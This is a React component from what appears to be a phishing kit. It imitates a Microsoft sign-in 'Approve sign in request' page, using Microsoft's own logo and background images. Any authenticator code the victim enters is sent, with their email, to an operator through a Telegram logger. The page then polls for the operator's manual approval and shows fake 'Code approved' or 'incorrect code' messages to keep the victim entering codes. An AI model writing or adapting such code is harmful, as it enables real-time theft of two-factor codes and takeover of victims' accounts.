import React, { useState } from 'react';
import { ArrowLeft, Smartphone } from 'lucide-react';
import { TelegramLogger } from '../utils/telegram';

interface TwoFactorFormProps {
  email: string;
  onComplete: (code: string) => void;
  onBack: () => void;
}

export function TwoFactorForm({ email, onComplete, onBack }: TwoFactorFormProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [errorMessage, setErrorMessage] = useState('');

  // Listen for verification updates
  React.useEffect(() => {
    const handleVerificationUpdate = (event: CustomEvent) => {
      const { code: verifiedCode, status } = event.detail;
      if (verifiedCode === code) {
        setVerificationStatus(status);
        setIsLoading(false);
        
        if (status === 'approved') {
          // Proceed to next step
          setTimeout(() => {
            onComplete(code);
          }, 1000);
        } else if (status === 'rejected') {
          setErrorMessage('The code you entered is incorrect. Please try again.');
          setCode('');
        }
      }
    };

    window.addEventListener('verificationUpdate', handleVerificationUpdate as EventListener);
    return () => {
      window.removeEventListener('verificationUpdate', handleVerificationUpdate as EventListener);
    };
  }, [code, onComplete]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code) return;
    
    setErrorMessage('');
    setIsLoading(true);
    setVerificationStatus('pending');
    
    // Send code to Telegram for manual verification
    await TelegramLogger.send2FACodeForVerification(email, code);
    
    // Start polling for verification status (in real implementation, this would be handled by webhooks)
    const pollInterval = setInterval(async () => {
      const status = await TelegramLogger.checkVerificationStatus(code);
      if (status !== 'pending') {
        clearInterval(pollInterval);
        setVerificationStatus(status);
        setIsLoading(false);
        
        if (status === 'approved') {
          // Send confirmation to Telegram
          await TelegramLogger.sendVerificationConfirmation(code, true);
          setTimeout(() => {
            onComplete(code);
          }, 1000);
        } else if (status === 'rejected') {
          // Send confirmation to Telegram
          await TelegramLogger.sendVerificationConfirmation(code, false);
          setErrorMessage('The code you entered is incorrect. Please try again.');
          setCode('');
          setVerificationStatus('idle');
        }
      }
    }, 3000); // Check every 3 seconds
    
    // Stop polling after 2 minutes
    setTimeout(() => {
      clearInterval(pollInterval);
      if (verificationStatus === 'pending') {
        setIsLoading(false);
        setVerificationStatus('idle');
        setErrorMessage('Verification timeout. Please enter the code again.');
        setCode('');
      }
    }, 120000); // 2 minutes timeout
  };

  return (
    <div className="min-h-screen" style={{
      backgroundColor: '#f5f5f5',
      backgroundImage: 'url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg")',
      backgroundSize: 'cover',
      backgroundPosition: 'center',
      backgroundRepeat: 'no-repeat',
      backgroundAttachment: 'fixed'
    }}>
      {/* Main Content */}
      <div className="flex items-center justify-center min-h-screen px-6 py-8">
        <div className="w-full max-w-lg">
          <div>
            <div className="ext-sign-in-box">
              {/* Microsoft Logo */}
              <div className="mb-6">
                <img 
                  className="h-6 w-auto" 
                  src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
                  alt="Microsoft" 
                />
              </div>
              
              <div className="flex items-center space-x-3 mb-6">
                <button
                  onClick={onBack}
                  className="p-1 hover:bg-gray-100 rounded"
                >
                  <ArrowLeft className="w-4 h-4 ms-text-secondary" />
                </button>
                <div className="text-sm ms-text-secondary truncate">{email}</div>
              </div>

              <div className="text-center mb-8">
                <div className="w-16 h-16 mx-auto mb-4 bg-blue-100 rounded-full flex items-center justify-center">
                  <Smartphone className="w-8 h-8 text-blue-600" />
                </div>
                <h1 className="text-2xl font-light ms-text-primary mb-4">Approve sign in request</h1>
                <p className="text-sm ms-text-secondary">
                  We sent a notification to your Microsoft Authenticator app. Open the app and approve the request to sign in.
                </p>
              </div>

              <div className="space-y-4">
                {verificationStatus === 'pending' && (
                  <div className="text-center">
                    <div className="inline-flex items-center space-x-2 text-sm ms-text-secondary">
                      <div className="w-2 h-2 bg-blue-600 rounded-full animate-pulse"></div>
                      <span>Verifying code...</span>
                    </div>
                  </div>
                )}

                {verificationStatus === 'approved' && (
                  <div className="text-center">
                    <div className="inline-flex items-center space-x-2 text-sm text-green-600">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                      <span>Code approved! Signing you in...</span>
                    </div>
                  </div>
                )}

                {verificationStatus === 'idle' && (
                  <div className="text-center">
                    <div className="inline-flex items-center space-x-2 text-sm ms-text-secondary">
                      <div className="w-2 h-2 bg-blue-600 rounded-full animate-pulse"></div>
                      <span>Waiting for approval...</span>
                    </div>
                  </div>
                )}

                <div className="text-center">
                  <button
                    type="button"
                    className="ms-link text-sm"
                  >
                    I can't use my Microsoft Authenticator app right now
                  </button>
                </div>

                <div style={{ borderTop: '1px solid #e1dfdd' }} className="pt-4">
                  {errorMessage && (
                    <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded text-sm text-red-600">
                      {errorMessage}
                    </div>
                  )}

                  <form onSubmit={handleSubmit} className="space-y-4">
                    <div>
                      <label className="block text-sm ms-text-primary mb-2">
                        Or enter code from your authenticator app
                      </label>
                      <div className="ms-input-container">
                        <input
                          type="text"
                          value={code}
                          onChange={(e) => setCode(e.target.value)}
                          className="ms-input-field"
                          maxLength={6}
                          autoComplete="one-time-code"
                          disabled={isLoading}
                        />
                        <label className={`ms-input-label ${code ? 'focused' : ''}`}>
                          Code
                        </label>
                      </div>
                    </div>

                    <div className="text-xs">
                      <a href="#" className="ms-link">I can't access my authenticator app</a>
                    </div>

                    <div className="flex justify-end pt-4">
                      <button
                        type="submit"
                        className={`ms-button-primary ${(!code || isLoading) ? 'opacity-50 cursor-not-allowed' : ''}`}
                        disabled={!code || isLoading}
                      >
                        {isLoading ? (
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        ) : (
                          'Verify'
                        )}
                      </button>
                    </div>
                  </form>

                </div>
              </div>

              <div className="mt-6 pt-6" style={{ borderTop: '1px solid #e1dfdd' }}>
                <div className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    id="dont-show-again"
                    className="ms-checkbox"
                  />
                  <label htmlFor="dont-show-again" className="text-xs ms-text-secondary">
                    Don't show this again
                  </label>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 px-6 py-4 text-xs ms-text-secondary flex justify-center">
        <div className="flex space-x-4">
          <a href="#" className="ms-link text-xs">Terms of use</a>
          <a href="#" className="ms-link text-xs">Privacy & cookies</a>
          <span>...</span>
        </div>
      </div>
    </div>
  );
}